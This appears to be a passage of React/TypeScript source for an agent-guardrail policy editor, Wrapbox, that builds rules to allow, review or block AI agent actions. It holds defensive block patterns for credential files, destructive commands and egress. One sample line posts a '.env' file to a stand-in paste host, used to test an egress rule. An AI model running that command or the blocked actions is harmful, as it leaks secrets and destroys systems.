import { AnimatePresence, motion } from "motion/react";
import { AlertTriangle, Check, Copy as CopyIcon, FileCode2, FlaskConical, History, Loader2, Lock, Pencil, Plus, Rocket, Trash2, Undo2, Wand2, Wrench, X } from "lucide-react";
import { useEffect, useMemo, useState, type ReactNode } from "react";
import { AGENTS, CATEGORIES, agentById, type Decision } from "../data/agents";
import { EFFECTS, effectInfo, fmtValue, fromYaml, ruleChips, ruleSig, toYaml, type ParseIssue, type Rule, type Tier } from "../data/contract";
import { personById } from "../data/people";
import { ACTS } from "../data/scenarios";
import { replayLog, type ReplayResult } from "../lib/replay";
import { ActionComposer, TraceView, type Composed } from "../components/composer";
import { RuleTester } from "../components/rule-tester";
import { orgSlug as orgSlugOf } from "../data/contract";
import { getState as storeState } from "../lib/store";
import { DESCRIBE_EXAMPLES, describeToRule } from "../lib/describe";
import { draftRule, type DraftResult } from "../lib/draft";
import { CodeBlock } from "../components/code";
import { Avatar, Button, Card, CardHead, Chip, DecisionPill, Drawer, Logo, Modal, PageHeader, Segmented, Toggle, cn } from "../components/ui";
import { evaluate, type Act } from "../lib/engine";
import { ago } from "../lib/router";
import { categoryOf, publishContract, setState, toast, useStore, useWorkspace, type ContractChange } from "../lib/store";

const DECISIONS: Decision[] = ["ALLOW", "REVIEW", "BLOCK"];

function DecisionSelect({ value, onChange, disabled, options = DECISIONS }: { value: Decision; onChange: (d: Decision) => void; disabled?: boolean; options?: Decision[] }) {
  return (
    <div className={cn("inline-flex rounded-lg border border-line bg-surface-2 p-0.5", disabled && "pointer-events-none")}>
      {options.map((d) => (
        <button
          key={d}
          onClick={() => onChange(d)}
          className={cn(
            "rounded-md px-2 h-6 font-mono text-[10.5px] font-semibold tracking-wide transition-colors",
            value === d ? (d === "ALLOW" ? "bg-allow text-white" : d === "REVIEW" ? "bg-review text-white" : d === "CONSTRAIN" ? "bg-constrain text-white" : "bg-block text-white") : "text-fg-3 hover:text-fg-2",
          )}
        >
          {d}
        </button>
      ))}
    </div>
  );
}

function TierEditor({ tiers, unit, onChange, readOnly }: { tiers: Tier[]; unit?: string; onChange: (t: Tier[]) => void; readOnly?: boolean }) {
  return (
    <div className="grid gap-1.5">
      {tiers.map((t, i) => {
        const prev = tiers[i - 1];
        return (
          <div key={i} className="flex flex-wrap items-center gap-2 rounded-lg border border-line bg-surface px-3 py-1.5">
            <span className="text-[12px] text-fg-3 w-[52px]">{t.max === null ? "above" : "up to"}</span>
            {t.max === null ? (
              <span className="font-mono text-[12.5px] w-[110px]">{fmtValue(prev?.max ?? 0, unit)}</span>
            ) : (
              <div className="flex items-center gap-1 w-[110px]">
                <span className="text-[12px] text-fg-3">{unit === "INR" ? "₹" : unit === "USD" ? "$" : ""}</span>
                <input
                  type="number"
                  value={t.max}
                  disabled={readOnly}
                  onChange={(e) => onChange(tiers.map((x, j) => (j === i ? { ...x, max: Math.max(0, Number(e.target.value) || 0) } : x)))}
                  className="w-full bg-transparent font-mono text-[12.5px] outline-none border-b border-dashed border-line-strong focus:border-fg disabled:border-transparent"
                />
                {unit === "%" && <span className="text-[12px] text-fg-3">%</span>}
              </div>
            )}
            <DecisionSelect value={t.decision} disabled={readOnly} onChange={(d) => onChange(tiers.map((x, j) => (j === i ? { ...x, decision: d, approvers: d === "REVIEW" ? x.approvers ?? "manager" : undefined } : x)))} />
            {t.approvers && (
              <span className="text-[11.5px] text-fg-3">
                {t.quorum && t.quorum > 1 ? `${t.quorum}× ` : ""}
                {t.approvers}
              </span>
            )}
          </div>
        );
      })}
    </div>
  );
}

function RuleRow({ rule, onChange, onEdit, onDelete, readOnly, dirty }: { rule: Rule; onChange: (r: Rule) => void; onEdit: () => void; onDelete: () => void; readOnly?: boolean; dirty?: boolean }) {
  // Rules synced from the live Control Plane match by their own condition_json, not by our
  // effect vocabulary — cp-map flattens them to a placeholder `policy.*` effect and keeps the
  // real condition in `why`. Rendering `effect: policy.*` as a match expression would be a
  // fabricated claim, so drop it and show what the rule actually matches on.
  const cpRule = rule.when.effect.length === 1 && rule.when.effect[0] === "policy.*";
  const chips: [string, string][] = cpRule
    ? [["matches", rule.why.includes("advanced condition:") ? "Control Plane condition (below)" : "every tool call"], ...ruleChips(rule).filter(([k]) => k !== "effect")]
    : ruleChips(rule);
  return (
    <div className={cn("group px-6 py-5 border-b border-line last:border-0", dirty && "bg-surface-2/70")}>
      <div className="flex flex-wrap items-start gap-3">
        <div className="min-w-0 flex-1">
          <div className="flex flex-wrap items-center gap-2">
            <span className="text-[13.5px] font-semibold">{rule.title}</span>
            {dirty && <Chip>edited</Chip>}
            {rule.custom && <Chip>yours</Chip>}
            {rule.mode === "observe" && <Chip tone="review">observe only</Chip>}
          </div>
          {rule.why && <div className="mt-0.5 text-[12px] text-fg-3">{rule.why}</div>}
          <div className="mt-2 flex flex-wrap gap-1.5">
            <span className="rounded bg-surface-2 border border-line px-1.5 py-px font-mono text-[10.5px] text-fg font-semibold">{rule.id}</span>
            {chips.map(([k, v]) => (
              <span key={k} className="rounded bg-surface-2 border border-line px-1.5 py-px font-mono text-[10.5px] text-fg-2 max-w-[320px] truncate">
                {k}: {v}
              </span>
            ))}
            {rule.approvers && <span className="rounded bg-review-soft px-1.5 py-px font-mono text-[10.5px] text-review">approvers: {rule.approvers}</span>}
          </div>
        </div>
        <div className="flex items-center gap-2">
          {rule.decision === "CONSTRAIN" ? (
            <div className="flex flex-col items-end gap-1">
              <DecisionPill d="CONSTRAIN" />
              <span className="font-mono text-[10.5px] text-fg-3">{rule.constrain}</span>
            </div>
          ) : rule.attenuate ? (
            <Chip>attenuate · child ≤ parent</Chip>
          ) : (
            rule.decision && <DecisionSelect value={rule.decision} disabled={readOnly} onChange={(d) => onChange({ ...rule, decision: d, approvers: d === "REVIEW" ? rule.approvers ?? "oncall-sre" : rule.approvers })} />
          )}
          {!readOnly && (
            <div className="flex items-center gap-0.5">
              <button title={rule.mode === "observe" ? "Enforce" : "Switch to observe mode"} onClick={() => onChange({ ...rule, mode: rule.mode === "observe" ? undefined : "observe" })} className="h-7 rounded-md px-1.5 text-[11px] text-fg-3 hover:text-fg hover:bg-surface-2">
                {rule.mode === "observe" ? "Enforce" : "Observe"}
              </button>
              <button title="Edit rule" onClick={onEdit} className="grid size-7 place-items-center rounded-md text-fg-3 hover:text-fg hover:bg-surface-2">
                <Pencil className="size-3.5" />
              </button>
              <button title="Delete rule" onClick={onDelete} className="grid size-7 place-items-center rounded-md text-fg-3 hover:text-block hover:bg-block-soft">
                <Trash2 className="size-3.5" />
              </button>
            </div>
          )}
        </div>
      </div>
      {rule.tiers && (
        <div className="mt-3">
          <TierEditor tiers={rule.tiers} unit={rule.unit} readOnly={readOnly} onChange={(tiers) => onChange({ ...rule, tiers })} />
        </div>
      )}
    </div>
  );
}

/* ================= Rule builder ================= */

function ChipInput({ values, onChange, placeholder }: { values: string[]; onChange: (v: string[]) => void; placeholder: string }) {
  const [v, setV] = useState("");
  const add = () => {
    const x = v.trim();
    if (x && !values.includes(x)) onChange([...values, x]);
    setV("");
  };
  return (
    <div className="flex flex-wrap items-center gap-1.5 rounded-xl border border-line bg-surface px-2 py-1.5 focus-within:border-fg-3 min-h-10">
      {values.map((x) => (
        <span key={x} className="inline-flex items-center gap-1 rounded-md bg-surface-2 border border-line pl-2 pr-1 h-6 font-mono text-[12px]">
          {x}
          <button onClick={() => onChange(values.filter((y) => y !== x))} className="text-fg-3 hover:text-fg" aria-label={`Remove ${x}`}>
            <X className="size-3" />
          </button>
        </span>
      ))}
      <input
        value={v}
        onChange={(e) => setV(e.target.value)}
        onKeyDown={(e) => {
          if (e.key === "Enter" || e.key === ",") {
            e.preventDefault();
            add();
          }
          if (e.key === "Backspace" && !v && values.length) onChange(values.slice(0, -1));
        }}
        onBlur={add}
        placeholder={values.length ? "add another…" : placeholder}
        className="flex-1 min-w-[140px] bg-transparent font-mono text-[12.5px] outline-none h-6"
      />
    </div>
  );
}

const GROUP_DEFAULTS = ["oncall-sre", "payments-manager", "claims-manager", "vp-sales", "finance-controller", "security"];

function defaultsFor(effect: string): Partial<Rule> {
  switch (effect) {
    case "filesystem.read":
      return { when: { effect: [effect], path: ["**/.env*"] }, decision: "BLOCK" };
    case "filesystem.write":
      return { when: { effect: [effect], path: ["**/migrations/**"] }, decision: "REVIEW", approvers: "oncall-sre" };
    case "shell.exec":
      return { when: { effect: [effect], command: ["terraform destroy*"] }, decision: "REVIEW", approvers: "oncall-sre" };
    case "git.push":
    case "git.merge":
      return { when: { effect: [effect], branch: ["main"] }, decision: "BLOCK" };
    case "database.read":
      return { when: { effect: [effect], columns: ["email", "phone"] }, decision: "CONSTRAIN", constrain: "mask" };
    case "database.write":
    case "database.migrate":
      return { when: { effect: [effect], env: ["production"] }, decision: "BLOCK" };
    case "payments.refund":
      return { when: { effect: [effect] }, unit: "USD", tiers: [{ max: 500, decision: "ALLOW" }, { max: 5000, decision: "REVIEW", approvers: "payments-manager" }, { max: null, decision: "BLOCK" }] };
    case "claims.payout":
      return { when: { effect: [effect] }, unit: "INR", tiers: [{ max: 25000, decision: "ALLOW" }, { max: 200000, decision: "REVIEW", approvers: "claims-manager" }, { max: null, decision: "REVIEW", approvers: "claims-manager", quorum: 2 }] };
    case "crm.apply_discount":
      return { when: { effect: [effect] }, unit: "%", tiers: [{ max: 10, decision: "ALLOW" }, { max: 25, decision: "REVIEW", approvers: "vp-sales" }, { max: null, decision: "BLOCK" }] };
    case "payment.submit":
      return { when: { effect: [effect] }, decision: "REVIEW", approvers: "finance-controller" };
    case "network.egress":
      return { when: { effect: [effect], destinationNotIn: ["api.github.com", "registry.npmjs.org"], credentials: true }, decision: "BLOCK" };
    default:
      return { when: { effect: [effect] }, attenuate: true };
  }
}

/** Turns an observed action into a starting rule. */
export function ruleFromAct(a: Act): Rule {
  const d = defaultsFor(a.effect);
  const when = { ...(d.when ?? { effect: [a.effect] }) };
  if (a.path) {
    const base = a.path.split("/").pop() ?? a.path;
    when.path = [/^\.env/.test(base) ? "**/.env*" : `**/${base}`];
  }
  if (a.command && a.effect === "shell.exec") when.command = [a.command.split(" ").slice(0, 2).join(" ") + "*"];
  if (a.branch && ["git.push", "git.merge"].includes(a.effect)) when.branch = [a.branch === "main" || a.branch === "master" ? a.branch : a.branch.replace(/\/.*$/, "/*")];
  if (a.env && ["database.write", "database.migrate", "shell.exec"].includes(a.effect)) when.env = [a.env];
  const info = effectInfo(a.effect);
  const detail = when.path?.[0] ?? when.command?.[0] ?? when.branch?.[0];
  return { id: "", title: `${info?.label ?? a.effect}${detail ? " — " + detail : ""}`, why: "", scope: "all", custom: true, ...d, when } as Rule;
}

function slug(s: string) {
  return s
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, ".")
    .replace(/^\.|\.$/g, "")
    .slice(0, 28);
}

const agentForEffect = (e: string) =>
  e.startsWith("payments") ? "stripe-mcp" : e === "claims.payout" ? "langgraph" : e === "crm.apply_discount" ? "agentforce" : e === "payment.submit" ? "browser-use" : e === "purchase.order" ? "openai-handoffs" : e.startsWith("database") ? "postgres-mcp" : "claude-code";

const sampleFor = (r: Rule) =>
  r.when.command?.[0]
    ? r.when.command[0].replace(/\*/g, " ").replace(/\s+/g, " ").trim()
    : r.when.path?.[0]
      ? `cat ${r.when.path[0].replace(/\*\*\//, "").replace(/\*/g, ".production")}`
      : r.when.branch?.[0]
        ? `git push origin ${r.when.branch[0].replace(/\*/g, "x")}`
        : r.when.destinationNotIn
          ? "curl -X POST https://paste.example -d @.env"
          : undefined;

export type BuildMode = "describe" | "build" | "code";
export function RuleBuilder({ open, initial, onClose, onSave, existingIds, startMode = "build" }: { open: boolean; initial: Rule | null; onClose: () => void; onSave: (r: Rule) => void; existingIds: string[]; startMode?: BuildMode }) {
  const groups = useStore((s) => s.groups);
  const blank = () => ruleFromAct({ effect: "shell.exec", command: "terraform destroy -auto-approve" });
  const [r, setR] = useState<Rule>(initial ?? blank());
  const [mode, setMode] = useState<BuildMode>(startMode);
  const [text, setText] = useState("");
  // Code tab: null means "derive from the rule"; a string means the engineer is editing it.
  const [yamlEdit, setYamlEdit] = useState<string | null>(null);
  // Code tab parse state: while its YAML is broken the rule behind it is stale, so saving is refused.
  const [yamlBroken, setYamlBroken] = useState(false);
  const [draft, setDraft] = useState<DraftResult>(() => ({ ...describeToRule("", []), source: "builtin" }));
  const [drafting, setDrafting] = useState(false);
  const idsKey = existingIds.join(",");
  useEffect(() => {
    if (!text.trim()) {
      setDraft({ ...describeToRule("", []), source: "builtin" });
      setDrafting(false);
      return;
    }
    const ctl = new AbortController();
    setDrafting(true);
    const t = setTimeout(async () => {
      try {
        setDraft(await draftRule(text, idsKey ? idsKey.split(",") : [], ctl.signal));
      } catch {
        /* superseded by the next keystroke */
      } finally {
        setDrafting(false);
      }
    }, 450);
    return () => {
      clearTimeout(t);
      ctl.abort();
    };
  }, [text, idsKey]);
  useEffect(() => {
    if (open) {
      setR(initial ?? blank());
      setMode(initial?.id ? "build" : startMode);
      setText("");
      setYamlEdit(null);
      setYamlBroken(false);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [open, initial]);
  const effect = r.when.effect[0];
  const info = effectInfo(effect);
  const fields = info?.fields ?? [];
  const setWhen = (w: Partial<Rule["when"]>) => setR((x) => ({ ...x, when: { ...x.when, ...w } }));
  const editing = !!initial?.id;
  const groupOptions = Array.from(new Set([...Object.keys(groups), ...GROUP_DEFAULTS]));
  const decisionOptions: Decision[] = info?.constrain ? ["ALLOW", "CONSTRAIN", "REVIEW", "BLOCK"] : ["ALLOW", "REVIEW", "BLOCK"];
  const toggle = <T,>(list: T[] | undefined, item: T) => {
    const has = list?.includes(item);
    const next = has ? list!.filter((x) => x !== item) : [...(list ?? []), item];
    return next.length ? next : undefined;
  };

  const save = () => {
    let id = r.id || slug(r.title) || slug(effect);
    if (!editing) {
      let n = 2;
      const base = id;
      while (existingIds.includes(id)) id = `${base}.${n++}`;
    }
    onSave({ ...r, id, custom: true });
  };

  return (
    <Drawer open={open} onClose={onClose} width={720} title={editing ? `Edit rule · ${initial?.id}` : "New rule"}>
      <div className="p-5 space-y-6">
        <div className="flex flex-wrap items-center gap-2">
          <Segmented
            size="sm"
            value={mode}
            onChange={(m) => {
              setYamlEdit(null);
              setYamlBroken(false);
              setMode(m as BuildMode);
            }}
            options={[
              { value: "describe", label: <span className="flex items-center gap-1.5"><Wand2 className="size-3.5" /> Describe</span> },
              { value: "build", label: "Build" },
              { value: "code", label: "Code" },
            ]}
          />
          <span className="text-[12px] text-fg-3">
            {mode === "describe" ? "Write it in plain English — Wrapbox drafts the rule, you check it." : mode === "build" ? "Pick the action and conditions from menus." : "The rule as it appears in wrapbox.yaml."}
          </span>
        </div>

        {mode === "describe" && (
          <DescribePanel
            text={text}
            setText={setText}
            draft={draft}
            drafting={drafting}
            onUse={() => {
              if (!draft.rule) return;
              setR(draft.rule);
              setMode("build");
            }}
          />
        )}

        {mode === "build" && (
          <>
        <Section n={1} title="When an agent tries to…">
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-1.5">
            {EFFECTS.map((e) => (
              <button
                key={e.id}
                onClick={() => {
                  const d = defaultsFor(e.id);
                  setR((x) => ({ ...x, decision: d.decision, tiers: d.tiers, unit: d.unit, attenuate: d.attenuate, constrain: d.constrain, approvers: d.approvers, quorum: undefined, when: d.when!, title: e.label }));
                }}
                className={cn("rounded-lg border px-2.5 py-2 text-left transition-colors", effect === e.id ? "border-fg bg-surface shadow-card" : "border-line hover:border-line-strong")}
              >
                <div className="text-[12.5px] font-medium">{e.label}</div>
                <div className="font-mono text-[10.5px] text-fg-3">{e.id}</div>
              </button>
            ))}
          </div>
        </Section>

        <Section n={2} title="…and it matches">
          <div className="space-y-3">
            {fields.includes("path") && (
              <Labeled label="File paths (globs)">
                <ChipInput values={r.when.path ?? []} onChange={(x) => setWhen({ path: x.length ? x : undefined })} placeholder="**/.env*   **/*.pem   ~/.aws/**" />
              </Labeled>
            )}
            {fields.includes("command") && (
              <Labeled label="Commands (* is a wildcard)">
                <ChipInput values={r.when.command ?? []} onChange={(x) => setWhen({ command: x.length ? x : undefined })} placeholder="kubectl delete * -n prod*" />
              </Labeled>
            )}
            {fields.includes("branch") && (
              <Labeled label="Branches">
                <ChipInput values={r.when.branch ?? []} onChange={(x) => setWhen({ branch: x.length ? x : undefined })} placeholder="main   release/*" />
              </Labeled>
            )}
            {fields.includes("columns") && (
              <Labeled label="Columns touched">
                <ChipInput values={r.when.columns ?? []} onChange={(x) => setWhen({ columns: x.length ? x : undefined })} placeholder="email   phone   pan" />
              </Labeled>
            )}
            {fields.includes("destination") && (
              <>
                <Labeled label="Allowed destinations (anything else matches)">
                  <ChipInput values={r.when.destinationNotIn ?? []} onChange={(x) => setWhen({ destinationNotIn: x.length ? x : undefined })} placeholder="api.github.com" />
                </Labeled>
                <label className="flex items-center gap-2 text-[12.5px]">
                  <Toggle on={!!r.when.credentials} onChange={(x) => setWhen({ credentials: x || undefined })} label="Carries credentials" /> Only when the payload carries credentials
                </label>
              </>
            )}
            {fields.includes("env") && (
              <Labeled label="Environments (none selected = all)">
                <div className="flex gap-1.5">
                  {["development", "staging", "production"].map((e) => (
                    <button key={e} onClick={() => setWhen({ env: toggle(r.when.env, e) })} className={cn("h-7 rounded-full border px-2.5 text-[12px]", r.when.env?.includes(e) ? "border-fg text-fg" : "border-line text-fg-3")}>
                      {e}
                    </button>
                  ))}
                </div>
              </Labeled>
            )}
            <Labeled label="Which agents (none selected = all)">
              <div className="flex flex-wrap gap-1.5">
                {CATEGORIES.map((c) => (
                  <button key={c.id} onClick={() => setWhen({ subject: toggle(r.when.subject, c.id) })} className={cn("h-7 rounded-full border px-2.5 text-[12px]", r.when.subject?.includes(c.id) ? "border-fg text-fg" : "border-line text-fg-3")}>
                    {c.name.replace(" agents", "").replace(" coding", "")}
                  </button>
                ))}
              </div>
            </Labeled>
          </div>
        </Section>

        <Section n={3} title="Then Wrapbox should…">
          {r.tiers ? (
            <TierEditor tiers={r.tiers} unit={r.unit} onChange={(tiers) => setR((x) => ({ ...x, tiers }))} />
          ) : r.attenuate ? (
            <div className="text-[12.5px] text-fg-2">Block anything above the budget the parent delegated; allow the rest.</div>
          ) : (
            <div className="space-y-3">
              <DecisionSelect value={r.decision ?? "BLOCK"} options={decisionOptions} onChange={(d) => setR((x) => ({ ...x, decision: d, constrain: d === "CONSTRAIN" ? info?.constrain : undefined, approvers: d === "REVIEW" ? x.approvers ?? "oncall-sre" : undefined }))} />
              {r.decision === "CONSTRAIN" && (
                <div className="text-[12px] text-fg-2">
                  Rewrite <span className="font-mono">{info?.constrain}</span> — {info?.constrain === "mask" ? "PII columns are masked and results capped at 500 rows." : "--force becomes --force-with-lease."}
                </div>
              )}
              {r.decision === "REVIEW" && (
                <div className="flex flex-wrap items-center gap-2 text-[12.5px]">
                  Approver group
                  <select value={r.approvers} onChange={(e) => setR((x) => ({ ...x, approvers: e.target.value }))} className="h-8 rounded-lg border border-line bg-surface px-2 font-mono text-[12px]">
                    {groupOptions.map((g) => (
                      <option key={g}>{g}</option>
                    ))}
                  </select>
                  signatures
                  <select value={r.quorum ?? 1} onChange={(e) => setR((x) => ({ ...x, quorum: Number(e.target.value) }))} className="h-8 rounded-lg border border-line bg-surface px-2 text-[12px]">
                    <option value={1}>1</option>
                    <option value={2}>2</option>
                  </select>
                  permit valid for
                  <select value={r.ttl ?? "60s"} onChange={(e) => setR((x) => ({ ...x, ttl: e.target.value }))} className="h-8 rounded-lg border border-line bg-surface px-2 text-[12px]">
                    <option>60s</option>
                    <option>5m</option>
                  </select>
                </div>
              )}
            </div>
          )}
          <div className="mt-3 flex flex-wrap items-center gap-2 text-[12.5px]">
            <Segmented size="sm" value={r.mode === "observe" ? "observe" : "enforce"} onChange={(m) => setR((x) => ({ ...x, mode: m === "observe" ? "observe" : undefined }))} options={[{ value: "enforce", label: "Enforce" }, { value: "observe", label: "Observe only" }]} />
            <span className="text-fg-3">{r.mode === "observe" ? "Logs what it would decide; doesn't stop anything yet." : "Applies as soon as you publish."}</span>
          </div>
        </Section>

        <Section n={4} title="Name it">
          <div className="grid gap-2 sm:grid-cols-[1fr_200px]">
            <input value={r.title} onChange={(e) => setR((x) => ({ ...x, title: e.target.value }))} className="h-10 rounded-xl border border-line bg-surface px-3 text-[13px] outline-none focus:border-fg-3" placeholder="Rule title" />
            <input value={r.id || slug(r.title)} disabled={editing} onChange={(e) => setR((x) => ({ ...x, id: slug(e.target.value) }))} className="h-10 rounded-xl border border-line bg-surface-2 px-3 font-mono text-[12.5px] outline-none disabled:opacity-60" placeholder="rule id" />
          </div>
          <input value={r.why} onChange={(e) => setR((x) => ({ ...x, why: e.target.value }))} className="mt-2 h-10 w-full rounded-xl border border-line bg-surface px-3 text-[13px] outline-none focus:border-fg-3" placeholder="Why this rule exists (employees see this when they're stopped)" />
        </Section>
          </>
        )}

        {mode === "code" && (
          <CodeTab
            rule={{ ...r, id: r.id || slug(r.title) || "new.rule" }}
            text={yamlEdit}
            onText={setYamlEdit}
            onRule={(next) => setR(next)}
            onValidity={setYamlBroken}
          />
        )}

        {mode === "build" && (
        <div className="grid gap-3 lg:grid-cols-2">
          <CodeBlock file="this rule in wrapbox.yaml" lang="yaml" code={toYaml([{ ...r, id: r.id || slug(r.title) || "new.rule" }], 0).split("\n").slice(7).join("\n")} maxH={280} />
          <div className="rounded-xl border border-line p-3.5 space-y-3">
            <div className="flex items-center justify-between gap-2">
              <div className="text-[12.5px] font-semibold flex items-center gap-1.5">
                <FlaskConical className="size-3.5" /> Test this rule
              </div>
            </div>
            <RuleTester rule={{ ...r, id: r.id || slug(r.title) || "new.rule" }} />
          </div>
        </div>
        )}

        {mode !== "describe" && (
        <div className="flex items-center justify-end gap-2 border-t border-line pt-4">
          <Button variant="ghost" onClick={onClose}>
            Cancel
          </Button>
          {mode === "code" && yamlBroken && <span className="mr-auto text-[12px] text-block">Fix the YAML errors before adding this rule.</span>}
          <Button variant="primary" onClick={save} disabled={!r.title.trim() || (mode === "code" && yamlBroken)}>
            <Check className="size-3.5" /> {editing ? "Save rule" : "Add to draft"}
          </Button>
        </div>
        )}
      </div>
    </Drawer>
  );
}

/** Engineering view of the same rule: the wrapbox.yaml an engineer would commit. */
function CodeTab({ rule, text, onText, onRule, onValidity }: { rule: Rule; text: string | null; onText: (v: string | null) => void; onRule: (r: Rule) => void; onValidity: (broken: boolean) => void }) {
  const org = orgSlugOf(storeState().domain, storeState().company);
  const derived = toYaml([rule], 0, org);
  const shown = text ?? derived;
  const [copied, setCopied] = useState<"yaml" | "path" | null>(null);

  // Validate on every keystroke: YAML syntax first, then the Wrapbox rule schema.
  const parsed = useMemo(() => fromYaml(shown), [shown]);
  const issues: ParseIssue[] = parsed.issues.length ? parsed.issues : parsed.rules.length !== 1 ? [{ msg: `this file must hold exactly one rule — found ${parsed.rules.length}` }] : [];
  const valid = issues.length === 0;
  const parsedRule = valid ? parsed.rules[0] : null;

  // A valid edit flows straight back into the shared rule, so Build shows the same policy.
  useEffect(() => {
    onValidity(!valid);
    if (text !== null && parsedRule && ruleSig(parsedRule) !== ruleSig(rule)) onRule(parsedRule);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [shown, valid]);

  const copy = async (what: "yaml" | "path") => {
    try {
      await navigator.clipboard.writeText(what === "yaml" ? shown : "wrapbox.yaml");
    } catch {
      /* clipboard blocked in the sandbox — still confirm */
    }
    setCopied(what);
    setTimeout(() => setCopied(null), 1400);
  };

  const summary = parsedRule
    ? ([
        ["Effect", parsedRule.when.effect.join(", ")],
        ["Decision", parsedRule.tiers ? `${parsedRule.tiers.length} tiers` : (parsedRule.decision ?? "—")],
        ["Scope", parsedRule.when.env?.join(", ") ?? "all environments"],
        ["Agents", parsedRule.when.subject?.length ? `${parsedRule.when.subject.length} categories` : "all"],
        ["Approver", parsedRule.approvers ?? parsedRule.tiers?.find((t) => t.approvers)?.approvers ?? "—"],
        ...(parsedRule.when.requires?.length ? ([["Context", `${parsedRule.when.requires.length} conditions`]] as [string, string][]) : []),
        ...(parsedRule.permit ? ([["Permit", `${parsedRule.permit.ttlSeconds}s${parsedRule.permit.singleUse ? " · single use" : ""}`]] as [string, string][]) : []),
      ] as [string, string][])
    : [];

  const lines = shown.split("\n").length;
  return (
    <div className="space-y-3">
      <div className="overflow-hidden rounded-xl bg-code border border-code-line">
        <div className="flex flex-wrap items-center gap-2 border-b border-code-line px-3.5 h-11">
          <FileCode2 className="size-3.5 shrink-0 text-[#8a95b3]" />
          <span className="font-mono text-[12px] text-[#dde3f3]">wrapbox.yaml</span>
          <span
            className={cn("inline-flex items-center gap-1 rounded-full px-2 py-0.5 text-[11px] font-semibold", valid ? "bg-[#0d271e] text-[#3fd49b]" : "bg-[#321219] text-[#ff8fa3]")}
          >
            {valid ? <Check className="size-3" strokeWidth={3} /> : <AlertTriangle className="size-3" />}
            {valid ? "Valid Wrapbox rule" : `${issues.length} error${issues.length > 1 ? "s" : ""}`}
          </span>
          <div className="ml-auto flex items-center gap-1">
            <button
              onClick={() => parsedRule && onText(toYaml([parsedRule], 0, org))}
              disabled={!valid}
              title="Normalise indentation and key order without changing the rule"
              className="inline-flex h-7 items-center gap-1 rounded-md px-2 text-[11.5px] text-[#a2acc5] hover:bg-white/10 hover:text-white disabled:opacity-40"
            >
              <Wrench className="size-3" /> Format
            </button>
            <button onClick={() => copy("yaml")} className="inline-flex h-7 items-center gap-1 rounded-md px-2 text-[11.5px] text-[#a2acc5] hover:bg-white/10 hover:text-white">
              {copied === "yaml" ? <Check className="size-3 text-[#3fd49b]" strokeWidth={3} /> : <CopyIcon className="size-3" />}
              {copied === "yaml" ? "Copied" : "Copy"}
            </button>
          </div>
        </div>

        <div className="flex max-h-[420px] overflow-auto scroll-thin">
          <pre aria-hidden className="select-none py-3 pl-3 pr-3 text-right font-mono text-[12.5px] leading-[1.65] text-[#3c4764]">
            {Array.from({ length: lines }, (_, i) => (
              <span key={i} className={cn("block", issues.some((x) => x.line === i + 1) && "text-[#ff6e8a]")}>
                {i + 1}
              </span>
            ))}
          </pre>
          <textarea
            value={shown}
            onChange={(e) => onText(e.target.value)}
            spellCheck={false}
            rows={lines + 1}
            aria-label="wrapbox.yaml"
            className="flex-1 min-w-0 resize-none bg-transparent py-3 pr-3 font-mono text-[12.5px] leading-[1.65] text-[#dde3f3] outline-none"
          />
        </div>

        {!valid && (
          <div className="space-y-1 border-t border-code-line bg-[#2a1018] px-3.5 py-2.5">
            {issues.slice(0, 6).map((x, i) => (
              <div key={i} className="font-mono text-[11.5px] text-[#ff8fa3]">
                {x.line ? `line ${x.line}: ` : ""}
                {x.msg}
              </div>
            ))}
          </div>
        )}
      </div>

      <div className="flex flex-wrap items-start gap-x-6 gap-y-2 rounded-xl border border-line bg-surface-2 px-3.5 py-3">
        {summary.length ? (
          summary.map(([k, v]) => (
            <div key={k} className="min-w-[120px]">
              <div className="text-[10.5px] uppercase tracking-wide text-fg-3">{k}</div>
              <div className="font-mono text-[12px] text-fg">{v}</div>
            </div>
          ))
        ) : (
          <div className="text-[12px] text-fg-3">Fix the errors above to see the rule summary.</div>
        )}
        <button onClick={() => copy("path")} className="ml-auto self-center inline-flex h-7 items-center gap-1.5 rounded-lg border border-line bg-surface px-2.5 text-[11.5px] text-fg-2 hover:border-line-strong hover:text-fg">
          {copied === "path" ? <Check className="size-3 text-allow" strokeWidth={3} /> : <CopyIcon className="size-3" />}
          {copied === "path" ? "Copied" : "Copy file path"}
        </button>
      </div>
      <p className="text-[11.5px] text-fg-3">Commit this to your repository as wrapbox.yaml, or keep editing here — Build stays in step with whatever parses.</p>
    </div>
  );
}

function DescribePanel({ text, setText, draft, drafting, onUse }: { text: string; setText: (v: string) => void; draft: DraftResult; drafting: boolean; onUse: () => void }) {
  const ready = !!draft.rule;
  return (
    <div className="space-y-4">
      <div>
        <div className="text-[12px] font-medium text-fg-2 mb-1.5">Say what should happen, the way you'd say it to a colleague</div>
        <textarea
          value={text}
          onChange={(e) => setText(e.target.value)}
          rows={3}
          autoFocus
          placeholder="Refunds over $500 need the payments manager"
          className="w-full rounded-xl border border-line bg-surface px-3.5 py-3 text-[14px] leading-relaxed outline-none focus:border-fg-3"
        />
        <div className="mt-2 flex flex-wrap gap-1.5">
          {DESCRIBE_EXAMPLES.slice(0, 5).map((x) => (
            <button key={x} onClick={() => setText(x)} className="rounded-full border border-line bg-surface-2 px-2.5 py-1 text-[11.5px] text-fg-2 hover:border-line-strong hover:text-fg">
              {x}
            </button>
          ))}
        </div>
      </div>

      {!!text.trim() && (
        <div className="grid gap-3 lg:grid-cols-2">
          <div className="rounded-xl border border-line p-3.5">
            <div className="flex items-center justify-between gap-2">
              <div className="text-[12.5px] font-semibold">What Wrapbox understood</div>
              <span className="flex items-center gap-1.5 text-[10.5px] text-fg-3">
                {drafting ? (
                  <>
                    <Loader2 className="size-3 animate-spin" /> drafting…
                  </>
                ) : draft.source === "openai" ? (
                  <span className="rounded-full bg-accent-soft px-2 py-0.5 font-semibold text-accent">drafted by {draft.model ?? "OpenAI"}</span>
                ) : (
                  <span className="rounded-full bg-surface-2 px-2 py-0.5 font-semibold text-fg-2">built-in parser</span>
                )}
              </span>
            </div>
            {draft.understood.length ? (
              <div className="mt-2 space-y-1.5">
                {draft.understood.map((u) => (
                  <div key={u.label + u.value} className="flex gap-2 text-[12.5px]">
                    <span className="w-[86px] shrink-0 text-fg-3">{u.label}</span>
                    <span className="font-medium">{u.value}</span>
                  </div>
                ))}
              </div>
            ) : (
              <div className="mt-2 text-[12.5px] text-fg-3">Nothing yet — try naming the action and what should happen.</div>
            )}
          </div>

          <div>
            {ready ? (
